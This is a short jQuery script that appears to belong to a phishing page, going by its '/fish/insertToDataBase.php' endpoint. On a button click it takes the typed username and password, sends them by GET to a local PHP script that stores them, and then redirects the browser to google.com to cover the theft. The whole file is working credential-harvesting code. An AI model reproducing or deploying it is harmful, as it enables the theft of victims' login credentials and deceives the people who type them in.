$(document).ready(function () {
    $("#btnSendInfo").click(function () {
        var user = $("#txtUsername").val();
        var pass = $("#txtPassword").val();
        $.ajax({
            type:'GET',
            url:'http://localhost:8082/fish/insertToDataBase.php',
            dataType:"json",
            data:{"user":user,"pass":pass},
            complete: function(xmlHttp) {
                if(xmlHttp.code !== 200) {
                    top.location.href = 'http://www.google.com';
                }
            }


        });

    }) ;

})   ;
